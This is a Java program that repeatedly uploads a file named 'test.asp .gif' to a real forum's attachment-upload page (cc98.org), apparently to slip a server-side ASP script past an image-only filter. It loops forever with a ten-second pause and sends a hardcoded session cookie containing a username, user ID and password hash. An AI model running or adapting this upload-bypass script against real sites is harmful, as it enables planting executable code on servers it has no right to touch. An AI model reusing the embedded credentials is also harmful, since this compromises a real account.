import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpException;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.NameValuePair;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.methods.multipart.FilePart;
import org.apache.commons.httpclient.methods.multipart.MultipartRequestEntity;
import org.apache.commons.httpclient.methods.multipart.Part;
import org.apache.commons.httpclient.methods.multipart.StringPart;


public class Laji {

	/**
	 * @param args
	 * @throws FileNotFoundException 
	 */
	public static void main(String[] args) throws FileNotFoundException {
		// TODO Auto-generated method stub
		HttpClient client = new HttpClient();
		client.getHostConfiguration().setHost("www.cc98.org", 80,
		"http");
		client
		.getParams()
		.setCookiePolicy(
				org.apache.commons.httpclient.cookie.CookiePolicy.BROWSER_COMPATIBILITY);
		client.getParams().setContentCharset("UTF-8");
		client.getHttpConnectionManager().getParams().setConnectionTimeout(50000);

			Random ranNumber = new Random();
			String[] content = {"清仓","好衣服","d","up","go"};
			int i=0;
			while(true){
				File targetFile = new File("D:\\test.asp .gif");
				
				Part[] parts = {new FilePart(targetFile.getName(),targetFile),new StringPart("file1","filename=\"D:\\test.asp .gif\" Content-Type: image/gif"),
						new StringPart("fname","D:\\test.asp .gif")};
				
				PostMethod pm = new PostMethod("http://www.cc98.org/saveannouce_upfile.asp?boardid=467");
				pm.setRequestEntity(new MultipartRequestEntity(parts,pm.getParams()));
				pm.setRequestHeader("Connection", "Keep-Alive");
				pm.setRequestHeader("Referer","http://www.cc98.org/saveannounce_upload.asp?boardid=467");
				pm.setRequestHeader("Cookie", "BoardList=BoardID=Show; aspsky=username=%E7%B1%B3%E7%A5%88&usercookies=3&userid=159686&useranony=&userhidden=2&password=b6e7a7361fd1862d; ASPSESSIONIDCQBRBQSR=KNFCAHDDJINPGOCHEPAICPFC");
				i++;
				//pm.setParameter("file1", "filename=\"C:\\Users\\Jacob\\Pictures\\code.gif\" Content-Type: image/gif");
				//pm.setParameter("fname", "C:\\Users\\Jacob\\Pictures\\code.gif");
				NameValuePair[] data ={		
					new NameValuePair("act","upload"),
					new NameValuePair("file1","filename=\"C:\\Users\\Jacob\\Pictures\\code.gif\" Content-Type: image/gif"),
					new NameValuePair("fname","C:\\Users\\Jacob\\Pictures\\code.gif"),
					new NameValuePair("Submit","上传"),

					
				};
				//pm.setRequestBody(data);
				try {
			       int res = 	client.executeMethod(pm);
			       if(res == HttpStatus.SC_OK){
			    	  String temp = pm.getResponseBodyAsString();
			    	  System.out.println(temp+i);
			       }
			       else 
			    	   System.out.println(pm.getResponseBodyAsString()+"\n error");
			       Thread.sleep(10000);
			       
					   
			      
			
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	}

